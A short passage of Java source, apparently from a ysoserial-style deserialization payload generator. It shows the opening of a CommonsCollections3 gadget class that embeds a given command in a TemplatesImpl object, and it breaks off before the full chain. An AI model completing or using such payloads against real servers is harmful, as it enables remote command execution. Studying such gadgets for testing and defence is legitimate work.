...
public class CommonsCollections3 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		Object templatesImpl = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
